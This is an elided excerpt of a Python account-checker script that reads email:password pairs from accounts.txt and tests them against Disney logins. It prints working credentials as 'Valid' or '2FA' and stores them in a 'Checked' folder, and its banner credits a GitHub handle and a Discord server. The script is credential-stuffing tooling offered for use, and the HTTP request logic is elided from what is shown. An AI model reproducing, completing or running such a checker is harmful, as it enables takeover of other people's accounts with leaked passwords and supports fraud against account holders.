...
def disney_checker(email, password):
    ...
    try: 
            ...
            if "\"operations\":[\"Register\"]" in r.text:
                ...
                time_rn = get_time_rn()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}/{gray}) {yellow}2FA {reset}| {pink}{email}{reset}:{pink}{password}")
                folder = "Checked"
            ...
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}+{gray}) {magenta}Valid {reset}| {pink}{email}{reset}:{pink}{password}")
            folder = "Checked"
            if not os.path.exists(folder):
                os.makedirs(folder)
...
Write.Print(f"""         github.com/kuzey1337 | discord.gg/clown
""", Colors.purple, interval=0.000)
time.sleep(2)
print("\n\n\n")
accounts = []
...
with open('accounts.txt', 'r') as file:
    for line in file:
        ...
        if ':' in line:
            ...
            print(f"Hatalı satır tespit edildi: {line}")
